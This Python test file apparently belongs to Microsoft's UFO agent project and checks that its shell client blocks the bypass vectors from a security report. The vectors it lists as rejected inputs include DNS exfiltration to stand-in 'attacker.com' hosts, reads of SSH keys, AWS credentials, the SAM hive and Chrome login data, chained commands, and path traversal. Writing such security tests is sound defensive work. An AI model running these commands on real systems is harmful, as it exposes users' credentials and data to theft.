# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

"""
Tests for the shell command security hardening in
``ufo.automator.app_apis.shell.shell_client``.

These tests exercise the bypass vectors documented in MSRC114053:
``run_shell`` / ``execute_command`` previously validated only the base
command against an allow-list, leaving allow-listed commands such as
``Get-Content``/``type``/``findstr`` free to read arbitrary files outside
the configured ``base_directory``.
"""

from __future__ import annotations

import importlib.util
import os
import sys
import types
import unittest
from pathlib import Path


# ---------------------------------------------------------------------------
# Load ``shell_client`` in isolation so we don't need to import the whole
# UFO package (which has heavyweight optional dependencies).
# ---------------------------------------------------------------------------
_REPO_ROOT = Path(__file__).resolve().parents[1]
_SHELL_CLIENT_PATH = (
    _REPO_ROOT
    / "ufo"
    / "automator"
    / "app_apis"
    / "shell"
    / "shell_client.py"
)


def _load_shell_client():
    # Provide a minimal stub for ``ufo.automator.basic`` so the import works
    # in isolation.
    if "ufo" not in sys.modules:
        sys.modules["ufo"] = types.ModuleType("ufo")
    if "ufo.automator" not in sys.modules:
        sys.modules["ufo.automator"] = types.ModuleType("ufo.automator")
    if "ufo.automator.basic" not in sys.modules:
        basic = types.ModuleType("ufo.automator.basic")

        class _Stub:  # noqa: D401 - test stub
            """Minimal stub for CommandBasic / ReceiverBasic."""

            _command_registry: dict = {}

            def __init__(self, *args, **kwargs):
                pass

            @classmethod
            def register(cls, command_cls):
                cls._command_registry[command_cls.__name__] = command_cls
                return command_cls

        basic.CommandBasic = _Stub
        basic.ReceiverBasic = _Stub
        sys.modules["ufo.automator.basic"] = basic

    spec = importlib.util.spec_from_file_location(
        "shell_client_under_test", _SHELL_CLIENT_PATH
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


sc = _load_shell_client()


class IsCommandAllowedTests(unittest.TestCase):
    """Verify the allow-list / dangerous-pattern surface."""

    def test_simple_relative_command_is_allowed(self):
        self.assertTrue(sc._is_command_allowed("Get-ChildItem"))
        self.assertTrue(sc._is_command_allowed("Get-Content notes.txt"))
        self.assertTrue(sc._is_command_allowed("Test-Path README.md"))

    def test_exfiltration_commands_removed_from_allowlist(self):
        # These were previously allow-listed and abusable for DNS/ICMP
        # exfiltration or bulk system-information disclosure.
        for cmd in (
            "nslookup data.attacker.com",
            "ping attacker.com",
            "tracert attacker.com",
            "whoami /all",
            "systeminfo",
            "ipconfig /all",
            "tasklist /v",
            "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(
                    sc._is_command_allowed(cmd),
                    f"{cmd!r} must no longer be allow-listed",
                )

    def test_statement_separator_blocked(self):
        # Allow-list previously inspected only the *first* token, letting an
        # attacker chain a second statement past the check.
        self.assertFalse(
            sc._is_command_allowed(
                "Get-ChildItem; Get-Content C:\\Users\\admin\\.ssh\\id_rsa"
            )
        )
        self.assertFalse(
            sc._is_command_allowed("Get-ChildItem && Remove-Item foo")
        )
        self.assertFalse(
            sc._is_command_allowed("Get-ChildItem || echo pwned")
        )

    def test_newline_injection_blocked(self):
        self.assertFalse(
            sc._is_command_allowed("Get-ChildItem\nGet-Content secrets.txt")
        )

    def test_registry_and_provider_paths_blocked(self):
        for cmd in (
            "Get-ChildItem HKLM:\\SOFTWARE",
            "Get-ChildItem Cert:\\LocalMachine\\My",
            "Get-Content Env:USERNAME",
            "Get-ChildItem Registry::HKEY_LOCAL_MACHINE",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(sc._is_command_allowed(cmd))

    def test_environment_expansion_blocked(self):
        for cmd in (
            "Get-Content $env:USERPROFILE\\.ssh\\id_rsa",
            "type %USERPROFILE%\\.ssh\\id_rsa",
            "Get-Content $HOME\\secrets.txt",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(sc._is_command_allowed(cmd))


class ValidateCommandPathsTests(unittest.TestCase):
    """Path-argument validation for allow-listed commands."""

    def setUp(self):
        # Use the OS temp dir as a self-contained base directory.
        import tempfile

        self.base_dir = tempfile.mkdtemp(prefix="ufo_shell_test_")
        self.addCleanup(self._cleanup)

    def _cleanup(self):
        import shutil

        shutil.rmtree(self.base_dir, ignore_errors=True)

    def test_relative_path_inside_base_is_allowed(self):
        # Create a real file inside base.
        target = Path(self.base_dir) / "notes.txt"
        target.write_text("hi", encoding="utf-8")
        self.assertIsNone(
            sc._validate_command_paths("Get-Content notes.txt", self.base_dir)
        )
        self.assertIsNone(
            sc._validate_command_paths(
                "Get-Content .\\notes.txt", self.base_dir
            )
        )

    def test_absolute_drive_path_rejected(self):
        result = sc._validate_command_paths(
            "Get-Content C:\\Users\\admin\\.ssh\\id_rsa", self.base_dir
        )
        self.assertIsNotNone(result)
        self.assertIn("absolute path", result)

    def test_unc_path_rejected(self):
        result = sc._validate_command_paths(
            "Get-Content \\\\evil\\share\\loot.txt", self.base_dir
        )
        self.assertIsNotNone(result)
        self.assertIn("UNC", result)

    def test_unix_absolute_path_rejected(self):
        result = sc._validate_command_paths(
            "type /etc/passwd", self.base_dir
        )
        self.assertIsNotNone(result)

    def test_path_traversal_rejected(self):
        result = sc._validate_command_paths(
            "Get-Content ..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            self.base_dir,
        )
        self.assertIsNotNone(result)
        self.assertIn("traversal", result)

    def test_home_shortcut_rejected(self):
        result = sc._validate_command_paths(
            "Get-Content ~/.ssh/id_rsa", self.base_dir
        )
        self.assertIsNotNone(result)
        self.assertIn("home", result)

    def test_findstr_recursive_with_external_path_rejected(self):
        result = sc._validate_command_paths(
            "findstr /s password C:\\Users\\admin\\Documents\\*.txt",
            self.base_dir,
        )
        self.assertIsNotNone(result)

    def test_powershell_switch_with_external_value_rejected(self):
        result = sc._validate_command_paths(
            "Get-Content -LiteralPath:C:\\Users\\admin\\.aws\\credentials",
            self.base_dir,
        )
        self.assertIsNotNone(result)

    def test_short_switches_are_not_treated_as_paths(self):
        # ``/s`` and ``-i`` are flags, not paths.
        self.assertIsNone(
            sc._validate_command_paths("findstr /s pattern", self.base_dir)
        )
        self.assertIsNone(
            sc._validate_command_paths(
                "Get-ChildItem -Recurse", self.base_dir
            )
        )


class RunShellIntegrationTests(unittest.TestCase):
    """End-to-end check that ``run_shell`` rejects the bypass vectors."""

    def setUp(self):
        import tempfile

        self.base_dir = tempfile.mkdtemp(prefix="ufo_shell_test_")
        self.receiver = sc.ShellReceiver(base_directory=self.base_dir)
        self.addCleanup(self._cleanup)

    def _cleanup(self):
        import shutil

        shutil.rmtree(self.base_dir, ignore_errors=True)

    def _assert_blocked(self, command: str) -> None:
        result = self.receiver.run_shell({"command": command})
        self.assertIsInstance(result, dict)
        self.assertIn(
            "error",
            result,
            f"run_shell should have rejected {command!r}, got {result!r}",
        )
        self.assertNotIn("stdout", result)

    def test_blocks_documented_bypass_vectors(self):
        # The 11 vectors enumerated in the MSRC114053 finder report.
        vectors = [
            "Get-Content C:\\Users\\admin\\.ssh\\id_rsa",
            "Get-Content C:\\Users\\admin\\.aws\\credentials",
            "type C:\\Windows\\System32\\config\\SAM",
            "findstr /s password C:\\Users\\admin\\Documents\\*.txt",
            "findstr /s /i api_key C:\\Users\\admin\\*.env",
            (
                "Get-Content C:\\Users\\admin\\AppData\\Local\\Google\\"
                "Chrome\\User Data\\Default\\Login Data"
            ),
            "nslookup stolen-data-here.attacker.com",
            "whoami /all",
            "systeminfo",
            "ipconfig /all",
            "tasklist /v",
        ]
        for cmd in vectors:
            with self.subTest(cmd=cmd):
                self._assert_blocked(cmd)

    def test_blocks_chained_statement(self):
        self._assert_blocked(
            "Get-ChildItem; Get-Content C:\\Users\\admin\\.ssh\\id_rsa"
        )

    def test_blocks_env_expansion(self):
        self._assert_blocked(
            "Get-Content $env:USERPROFILE\\.ssh\\id_rsa"
        )


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
